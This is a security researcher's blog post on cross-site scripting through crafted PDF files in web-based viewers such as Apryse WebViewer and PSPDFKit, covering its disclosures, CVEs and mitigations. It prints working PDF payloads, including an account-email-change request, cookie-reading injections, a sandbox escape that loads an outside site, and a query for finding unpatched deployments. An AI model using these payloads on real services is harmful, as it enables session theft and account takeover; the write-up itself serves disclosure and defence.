---
title: JavaScript-based PDF Viewers, Cross Site Scripting, and PDF files.
author: Luigi Gubello
type: post
date: 2024-08-27T00:26:54+00:00
url: /blog/pdf-viewers-xss-and-pdf-files/
categories:
  - Bug Bounty
  - English
  - IT Security
  - XSS

---
> **❗️Disclosure:** I worked at Smallpdf from January to November 2021\. In that period, Smallpdf used PDFTron WebViewer SDK (now Apryse PDF WebViewer) to render PDF files in the browser. This information was [public](https://web.archive.org/web/20240816134346/https://smallpdf.com/library-detail).

## Interview and first XSS in PDFTron WebViewer

In October 2020, I started my job interview with Smallpdf for a Cloud Security Engineer position. During the interview process, I began to use Smallpdf as a service to "play" with it, and being a web application that renders PDF files, I tried to exploit PDF files to inject arbitrary Javascript code.

### app.alert(1) is not a vulnerability, but confirm(1) maybe yes

If you try to open a PDF file in your browser, it will probably be rendered correctly, and you can easily read it. This is a huge improvement compared to the early 2000s when you needed to download PDF files and open them with a specific reader (e.g. Adobe Reader) because now most popular browsers support natively PDF rendering, Chromium family using PDFium, a component written in C++ (born on Foxit PDF rendering engine's ashes), and Firefox using PDF.js, a component written in Javascript.

The two components, PDFium and PDF.js, support a restricted set of features to render PDF files for security reasons, in particular, Acrobat Javascript API support is highly restricted, but both support the alert box message: `app.alert(1)`.

This Acrobat Javascript code runs the "classic" alert box message in the browsers, commonly triggered in the proofs of concept for XSS vulnerabilities, but, due to limitations in PDFium and PDF.js to Acrobat Javascript APIs (that is to say intentionally missing code and features in [PDF.js](https://github.com/mozilla/pdf.js/blob/cf3a35e9daaa5a456109943b4cfc87c0471118b8/src/scripting\_api/app.js\#L523-L601) and [PDFium](https://pdfium.googlesource.com/pdfium/+/7282f483c6a50bcfdebece10408a5c76245d69e4/fxjs/cjs\_app.cpp)), this code doesn't prove any execution of arbitrary Javascript code or malicious Javascript code and this behavior is **not** a vulnerability. But what if I can run a Javascript function that is not defined in the source code, like `confirm(1)`? In that case, the library or component rendering the PDF file might be vulnerable or misconfigured.

### Cross-site scripting in Smallpdf via crafted PDF file (2020)

{{< youtube 2-CcFJKQX0A >}}
&nbsp;

During my interview process, I started to investigate PDF files as a vector for injections. The function `app.alert(1)` remains significant for penetration testers and bug bounty hunters because many PDF readers (such as Adobe Reader, Foxit) and PDF rendering libraries (like Apryse PDF SDK, PSPDFKit SDK, PDF.js) allow users to disable JavaScript support. This alert pop-up is an effective way to quickly understand if JavaScript has been disabled by the user, or developers: if you see the alert box, the library or the reader runs JavaScript code from the PDF file.

The JavaScript API in PDF readers, particularly Foxit and Adobe, has long been considered a risky feature from both a technical and design perspective. Over the years, this feature has been the weak point numerous times to execute arbitrary code on machines with the affected readers installed (e.g., [CVE-2008-2992](https://nvd.nist.gov/vuln/detail/CVE-2008-2992), [CVE-2017-13056](https://nvd.nist.gov/vuln/detail/CVE-2017-13056), [CVE-2018-19445](https://nvd.nist.gov/vuln/detail/CVE-2018-19445), [CVE-2021-45979](https://nvd.nist.gov/vuln/detail/CVE-2021-45979)).

Due to my lack of knowledge (a.k.a ignorance), I attempted to brutally inject arbitrary JavaScript code into a PDF file, and to my surprise, it worked\! I successfully executed arbitrary JavaScript on the domain `smallpdf.com`. Below, you can read the proof-of-concept code that I shared with the Smallpdf CTO during my interview.

```
<</JS(
    try {
        app.alert\("XSS!"\);
        var xmlhttp = new XMLHttpRequest\(\);
        var theUrl = "https://pro.smallpdf.com/pro/change-email";
        xmlhttp.open\("POST", theUrl, true\);
        xmlhttp.withCredentials = true;
        xmlhttp.setRequestHeader\("Content-Type", "text/plain;charset=UTF-8"\);
        xmlhttp.send\(JSON.stringify\({"email":"example+hacked@example.com"}\)\);
    } catch \(e\) {
        app.alert\(e.message\);
    }
)/S/JavaScript>>
```

The reason why I didn't use `alert()` or `confirm()` to print the session cookie was that the session cookie had the flag `HttpOnly` (another good reason for not using just `alert()` pop-up in the proofs of concept for XSS vulnerabilities, I recommend this LiveOverflow's video:  [DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c)). The vulnerable component was PDFTron WebViewer SDK (now [Apriyse Webviewer](https://apryse.com/products/webviewer)), so I reported the vulnerability to the PDFTron Support Team, as they didn't yet have a proper security contact or Vulnerability Disclosure Policy. They mitigated the issue and asked me to test the fix. At that time, using the same payload, I could not reproduce the issue again, confirming that the mitigation was effective. I'll provide more details about the vulnerable code in the following paragraphs.

### Mitigation

The initial mitigation by the Smallpdf Engineering Team was easy and effective: they simply disabled Acrobat JavaScript API support in the PDFTron WebViewer SDK by using [`disableEmbeddedJavaScript()`](https://docs.apryse.com/documentation/web/guides/forms/embedded-js/). All major Apryse PDF WebViewer SDK versions have Acrobat JavaScript support enabled by default.

## 2021 and 2022: Disclosures to the PDFTron and PSPDFKit Teams

Between 2021 and 2022, I continued investigating PDF files as a vector for JavaScript injections in web apps, with a focus on the two commercial libraries I considered \- and still consider \- the most popular for PDF rendering, processing, and editing: Apryse PDF Webviewer and PSPDFKit. The idea was pretty trivial: humans often make the same errors, so I tried to reproduce old vulnerabilities related to popular PDF readers, by adapting them to the new context (JavaScript instead of C++).

### It's always app.launchURL()

In 2021, and 2022, I reported two other cross-site scripting vulnerabilities to Apryse Support Team. The first one was a "classic" JavaScript injection where the user's input was not properly sanitized, and it may remind [CVE-2018-5158](https://bugzilla.mozilla.org/show\_bug.cgi?id=1452075). The injection entry point was the author's name of the annotation.

```
<<
    /Type /Annot /Rect [1 1 1 1] 
    /Subtype /Text /M (D:20210402013803+02'00) /C [1 1 0 ] 
    /Popup 15 0 R /T (\">'><details open ontoggle=confirm\(3\)>) 
    /P 6 0 R /Contents (MyNoteHere) 
>> 
```

The second one was a design error in the implementation of the Acrobat JavaScript API `app.launchURL()`, a popular entry point also in other PDF readers to run arbitrary code (like [CVE-2017-7442](https://packetstormsecurity.com/files/143621/Nitro-Pro-PDF-Reader-11.0.3.173-Remote-Code-Execution.html) in Nitro Pro PDF Reader). Even if I could not inject arbitrary JavaScript code directly in a `/JS` entry (well, this is not properly correct, but we'll return to this point later), I could still abuse the implemented JavaScript API.

```
/JS (app.launchURL\("javascript:confirm\(3\);", true\);)
```

Acrobat JavaScript support in Apryse WebViewer is a sort of "sandboxed" layer to emulate the Acrobat JavaScript API behavior, and, at that time, `app.launchURL()` was just the object `window.location.href`, but renamed, so it was possible to inject arbitrary JavaScript code in the parent page using the pseudo-protocol `javascript:`. Usually, this would not be a security issue in a desktop reader like Adobe Reader, but in a browser reader, yes.

Another important player in commercial software to process PDF files directly in web applications (browsers, Electron, etc.) is PSPDFKit. My question was: "*Can I run arbitrary code on a machine through a PDF file in a web app?*" and the answer is "*Yes, if you have an Electron application*". The following issue, sent to the PSPDFKit Team in 2021, cannot be considered a proper vulnerability because it was found in a demo application ([PSPDFKit/pspdfkit-electron-example](https://github.com/PSPDFKit/pspdfkit-electron-example)), definitely not designed to run in production, but it shows how PDF files can be used as vectors to exploit well-known vulnerability classes in the web applications.

{{< youtube RUDaoZdktbk >}}
&nbsp;

The security issue was related to two Electron settings, `contextIsolation` and `nodeIntegration`, which are a [well-known security risk](https://shabarkin.notion.site/0-click-RCE-in-Electron-Applications-461a69d8d1e848f0be225891905d4705) in Electron applications if misconfigured for a production environment. Shortly, due to an unsafe configuration of the Electron application, every external URL could be abused to load arbitrary JavaScript code. In PDF format there are at least two entries that can be used to open links: `/URI()` and `/JS(app.launchURL())`. The entry `/URI()` is the common blue hyperlink, that the user must click to be redirected, instead the entry `/JS(app.launchURL())` is sneakier in the PSPDFKit-based reader because it runs when the user opens the file, without any security warns, leading to a 0-click RCE. In the proof-of-concept video, I showed a 1-click RCE, using `/URI()`, for clarity.

Also in PSPDFKit SDK, JavaScript support was enabled by default. They disabled it in 2022 or 2023\.

A last interesting thing about PSPDFKit, which makes the product interesting from a security perspective, is its implementation of the Acrobat JavaScript API: PSPDFKit is a WASM application, and Acrobat JavaScript scripts run in a sandboxed environment via [Duktape](https://duktape.org/), an embeddable JavaScript engine. This solution seems to be a great mitigation layer to prevent arbitrary JavaScript injections, at least the best solution I have ever seen until now on this kind of library.

```
<</JS(
    app.alert\(Object.keys\(this\)\); 
    app.alert\(Object.getOwnPropertyNames\(this\)\); 
    eval\("app.alert\(Object.getOwnPropertyNames\(Duktape\)\)"\);)
/S/JavaScript>>
```

## 2024: Responsible disclosure to the Apryse Security Team and unintentional full disclosure

Since 2020, I have never stopped to play with PDF files as injection vectors in web applications. I don't know why a file format that is so old has triggered me so much, but here we go again. My white whale is a cross-site scripting vulnerability via a crafted PDF file in the queen of JavaScript PDF rendering libraries: PDF.js. I have read the code \- well, not every line, because I am not such a good developer \-, I have read GitHub issues and pull requests, and the maintainers are doing a great job, it's one of my favorite projects written in JavaScript, you can learn a lot simply opening the project's [test folder](https://github.com/mozilla/pdf.js/tree/master/test).

Unfortunately, I am still not good enough to find an XSS vulnerability in PDF.js, still, [Thomas Rinsma](https://x.com/thomasrinsma) has been able to find a cross-site scripting vulnerability this year ([CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)) and has written an amazing blog post about that: [CVE-2024-4367 – Arbitrary JavaScript execution in PDF.js](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/). One of my favorite write-ups in 2024, so far.

But, even if PDF.js is the most popular NPM package used to render and process PDF files, this is not the library used by Dropbox. [Dropbox uses Apryse WebViewer](https://apryse.com/blog/customers/dropbox). I didn't know this until a few weeks ago. How did I find out? By spotting a Content-Security-Policy error in my browser's developer console while I was using Dropbox to store my PDF payloads ([luigigubello/PayloadsAllThePDFs](https://github.com/luigigubello/PayloadsAllThePDFs)). But let us take one step at a time. It was June 2023...

### CVE-2024-4327: Sandbox in pure JavaScript is an illusion

In June 2023, I read the write-up "[Why Building a Sandbox in Pure Javascript is a Fool’s Errand](https://d0nut.medium.com/why-building-a-sandbox-in-pure-javascript-is-a-fools-errand-d425b77b2899)". For me that I'm not a JavaScript developer, it was mindblowing 🤯 because it shows a basic concept: you can almost always escape from a sandbox written in JavaScript, security by obscurity doesn't work. And, after I finished reading the post, I was \- and I still am \- fully convinced of this.

After this write-up, it was clear that Apryse WebViewer was probably using a JavaScript-based sandbox to limit arbitrary code injections in `/JS` entries because they required, and still require, `unsafe-eval` in their [recommended Content-Security-Policy](https://docs.apryse.com/documentation/web/faq/content-security-policy/) to run embedded JavaScript. How does Apryse WebViewer run embedded JavaScript? It's just an `eval()`\! **This is why in 2020 I was able to inject and run arbitrary JavaScript code\!** Because in 2020, they had no sandbox.

When Apryse WebViewer SDK needs to load a JavaScript code embedded in a PDF, it looks for `/JS` entries, *"pass the code through the sandbox"*, and runs `eval()` on it, and the embedded JavaScript code is run in an invisible iframe titled `jsenabled` (at least in Apryse WebViewer SDK 10.x). In the iframe, the following `<script>` tags load the embedded JavaScript:

```
<script>var event = {};</script>
<script>window.__add_action = function(__script){ return function(){eval(__script); } }</script>
```

By reading the code of [Apryse WebViewer Core](https://docs.apryse.com/documentation/web/get-started/without-viewer/), usually named `webviewer.min.js` or `webviewer-core.min.js`, I found the exact reference to the rendered code in the PDF reader UI (sample from a `webviewer-core.min.js` v10.6).

```
this.ul = document.createElement("iframe"); 
this.ul.style.height = "0px"; 
this.ul.style.width = "0px"; 
this.ul.style.borderWidth = "0px"; 
this.ul.title = "jsenabled"; 
document.body.appendChild(this.ul); 
this.Xp = this.ul.contentWindow; 
var Na = this.Xp.document; Na.open(); 
Na.write("<!DOCTYPE html>"); 
Na.write("<script>var event = {};\x3c/script>"); 
Na.write("<script>window.__add_action = function(__script){ return function(){eval(__script); } }\x3c/script>"); 
Na.close(); 
this.Xp.__assign = function (La, Za) { Ca.Xp[La] = Za; Ca.Cn[La] = Za }; 
this.Tr = !1; this.V2 = ""; 
this.Cn = {}; 
Object.keys(Ea).forEach(function (La) { Ea.hasOwnProperty(La) && (Ca.Cn[La] = Ea[La]) });
w(this.Cn)
```

Now, I knew they used and always had used `eval()` to load embedded JavaScript, and, after my first report, a JavaScript sandbox to mitigate the reported issue and "emulate" Acrobat JavaScript API.I used the payload from [d0nut](https://x.com/d0nutptr)'s write-up to bypass Apryse's sandbox and uploaded a PoC PDF file to my GitHub repo [luigigubello/PayloadsAllThePDFs](https://github.com/luigigubello/PayloadsAllThePDFs) in June 2023\.

```
/JS (
    app.alert\(1\); 
    Object.getPrototypeOf(function*(){}).constructor = null; ((function*(){}).constructor("document.write('<script>confirm(document.cookie);</script><iframe src=https://14.rs>');"))().next();
    )
```

Meanwhile, the repository *PayloadsAllThePDFs* was becoming popular in the bug bounty hunters' community, and that PoC PDF file (`payload1.pdf`) has been silently online for one year. Silently, until April 2024\.

In April 2024, the bug bounty hunter [Hamza Grindi](https://bugcrowd.com/Hamza\_G) reported the issue to Apryse via [VulnDB](https://vuldb.com/?submit.321231).

I haven't reported this issue to Apryse because I didn't initially consider it a true security bug, although I could have been mistaken about it. The SDK worked as expected: `eval()` simply executed arbitrary JavaScript code from the PDF file. The sandbox provided security through obscurity, which could not be a solution. Or maybe I have just forgotten to report it 🥲

### CVE-2024-29359: Looking for a cross-site-scripting vulnerability to bypass a CSP policy

But come back to Dropbox. So, we know embedded JavaScript can run only if the Content-Security-Policy has the directive `unsafe-eval` (of course). The Dropbox engineering and security teams did a great job:

1. The Apryse WebViewer is loaded in the sandbox domain `*.dropboxusercontent.com`, but then the Apryse WebViewer is embedded in `dropbox.com` through the iframe `document-preview-frame`, which should mitigate the risk.  
2. The HTML page where the script `webviewer-core.min.js` is loaded has a Content-Security-Policy defined in a `meta` tag, and the directive `unsafe-eval` is not defined, but the Dropbox security team cannot receive CSP reports if the policy is violated (but this may not be so important for them, because the WebViewer is loaded in a sandbox domain).

The Dropbox security team has also left a curious message in the HTML page, where the Apryise WebViewer script is loaded:

```
<!-- TODO: For the CSP unsafe-inline of script-src, it is probably required by PDFTron. ORGWRK-3021 a followup investigation task to see if we can better handle it -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' blob:; font-src 'self' data:; object-src 'none'; form-action 'none'; img-src 'self' blob: data:; style-src 'self' 'unsafe-inline'">
```

They definitely know what they are doing\! And now it's clear why I have seen a Content-Security-Policy violation on `dropbox.com` in my web developer console. So, the only way to inject JavaScript code through a PDF file is to find an injection endpoint that doesn't violate the page's Content-Security-Policy.

✨ Said and done\! ✨ Another potential entry point? AcroForms\! These are interactive form fields within PDFs that users can fill out or interact with, making them an ideal target for manipulation. By using embedded JavaScript code, it's possible to legitimately modify these forms (e.g., editing the content). The key idea is that these operations occur within the DOM. Without proper sanitization, it would have been possible to exploit these forms to inject arbitrary JavaScript code. This is exactly **CVE-2024-29359**. The following code shows the proof-of-concept (`payload7.pdf`).

```
<<
  /Type /Annot
  /Subtype /Widget
  /FT /Tx
  /T (MyField)
  /V (">'></div><details/open/ontoggle=confirm(document.cookie)></details>)
  /Rect [ 100 200 150 250 ]
  /AA 11 0 R
>>
```

This is clearly a vulnerability, so I reported it to Apryse in March 2024\. This time, I didn't go through their support team because they had implemented a brief Vulnerability Disclosure Policy, set up a dedicated security email address, and provided a direct link on their homepage for reporting vulnerabilities (great job, Apryse security team\!): [Report A Vulnerability](https://apryse.com/form/report-vulnerability). They fixed the issue in a few days, really quickly.

So the report by another security researcher for CVE-2024-4327 in April 2024, so close to my last report, was just a coincidence. In May 2024, the Apryse security team published a blog post, [Regarding Cross-Site Scripting (XSS) Vulnerabilities in WebViewer SDK](https://apryse.com/blog-regarding-xss-vulnerabilities-in-webviewer), recommending to their customers to enable the Content-Security-Policy to mitigate these risks and to update the package.

Now I could run arbitrary JavaScript code in the Dropbox PDF Viewer, even if it runs in a sandbox domain. The Dropbox security team closed my report in their bug bounty program as *Out-of-Scope*. Fair enough, I guess, `dropboxusercontent.com` is in their Out of Scope list.

Apparently, they have not updated Apryse WebViwer yet (August 2024), so you can try to find a way to escalate this XSS. I have not invested my time in investigating my theory, but I am quite sure you can manipulate PDF file in Dropbox using Apryse WebViever SDK during a signature process, this could be fun.

{{< youtube m3n7vWphCNQ >}}
&nbsp;

## Final considerations

The techniques and approaches described in this write-up have also been used to discover cross-site scripting (XSS) vulnerabilities in other NPM packages, such as [Foxit PDF SDK for Web](https://www.npmjs.com/package/@foxitsoftware/foxit-pdf-sdk-for-web-library), [Syncfusion ej2-pdfviewer](https://www.npmjs.com/package/@syncfusion/ej2-pdfviewer), and [React PDF Viewer](https://www.npmjs.com/package/@react-pdf-viewer/core). This demonstrates how PDF files may remain a good attack vector, now in web applications. Services that can run and operate in a browser are fast growing because they can be used everywhere (regardless of operating system or hardware), PDF is still a popular format used daily by millions to share documents, and electronic signature is here to stay, by making PDF great again for payloads and explotation. Currently, I see two dominant players in the NPM ecosystem: the open-source PDF.js, which serves as the backbone for many open-source projects that need to process and render PDFs, and the commercial Apryse WebViewer SDK. However, we may see new players emerge in the coming years.

And who knows? Perhaps in the future, we might sign documents online [while playing Breakout](https://github.com/osnr/horrifying-pdf-experiments), all within the same PDF.

If you are still interested in PDF as a web attack vector, I would recommend the following sources, they could help you better understand this format and how huge the surface you can try to exploit:

- [JavaScript™ for Acrobat® API Reference](http://wwwimages.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/js\_api\_reference.pdf) (2007)  
- [Quickpost: About the Physical and Logical Structure of PDF Files](https://blog.didierstevens.com/2008/04/09/quickpost-about-the-physical-and-logical-structure-of-pdf-files/) by [Didier Stevens](https://twitter.com/DidierStevens) (2008)  
- [How to really obfuscateyour PDF malware](https://static.googleusercontent.com/media/www.zynamics.com/it//downloads/recon\_pdf.pdf) by [Sebastian Porst](https://twitter.com/LambdaCube) (2010)  
- [Threat Modelling Adobe PDF](https://www.dst.defence.gov.au/sites/default/files/publications/documents/DSTO-TR-2730.pdf) by Ron Brandis and Luke Steller (2012)  
- [Advanced PDF Tricks](https://github.com/angea/PDF101/blob/master/presentations/troopers15/Albertini%2BPfeifle%20-%20Advanced%20PDF%20Tricks.pdf) by [Ange Albertini](https://twitter.com/angealbertini) and [Kurt Pfeifle](https://twitter.com/pdfkungfoo) (2015)  
- [Let's Write a PDF File](https://github.com/corkami/docs/blob/master/slides/1507-LetsWriteAPDFFile.pdf) by [Ange Albertini](https://twitter.com/angealbertini) (2015)  
- [Malicious PDFs | Revealing the Techniques Behind the Attacks](https://www.sentinelone.com/blog/malicious-pdfs-revealing-techniques-behind-attacks/) (2019)

### For security teams

PDF files can have a huge attack surface, so my recommendation is to try reducing it, according to the service purpose, and implementing a Content-Security-Policy.

1. **Disabling embedded JavaScript support.** Usually, legitimate PDF files don't have embedded JavaScript, so it might be a good idea to disable the support at the SDK level. The impacted legitimate users should be low.  
2. **Implementing a Content-Security-Policy.** All the previous JavaScript code injections (or almost all) could be avoided by setting a "strict enough" Content Security Policy. A Content-Security-Policy v3 (nonce or hash \+ `'strict-dynamic'` directive might be enough) can easily mitigate common injections and cross-site scripting vulnerabilities, by giving your team time to update the package if a new vulnerability is found.  
3. **Processing PDFs in the backend.** It depends on the kind of applications or services you are building or maintaining, but file content sanitization in the backend might help prevent client-side injections. Of course, this can change your threat model, and you should pay attention to the backend and how to avoid injections or other vulnerabilities in the backend's services.  
4. **Loading PDFs in a sandbox domain.** As the Dropbox team demonstrated, loading untrusted PDF files in a sandboxed domain can help reduce the attack surface. Malicious JavaScript code would not have access to the user's session (such as access tokens in local storage or authenticated requests), adding another layer that attackers would need to bypass.

If your team is also managing a bug bounty program, remind them `app.alert(1)` usually is not a vulnerability, a pop-up alert is not enough (not to make like [Deloitte and CVE-2020-26505](https://www2.deloitte.com/de/de/pages/risk/articles/marmind-xss.html?nc=1)).

### For bug bounty hunters

While I am writing, Dropbox has not updated the Apryse WebViewer package yet, so it is still vulnerable to CVE-2024-29359, in a sandbox domain. If you find a way to bypass the domain isolation, or you can maliciously manipulate the document during the e-signature process, it might be a valid report, even if the JavaScript code runs in a sandbox domain.

In addition, you can try to find services that use Apryse WebViewer by running the following urlscan.io query: [`filename:("webviewer-core.min.js" OR "webviewer.min.js")`](https://urlscan.io/search/\#filename%3A(%22webviewer-core.min.js%22%20OR%20%22webviewer.min.js%22)). Similar solution for `PDF.js`.

If you find a web-based PDF viewer, you could be interested in testing it using this set of payloads: [luigigubello/PayloadsAllThePDFs](https://github.com/luigigubello/PayloadsAllThePDFs).
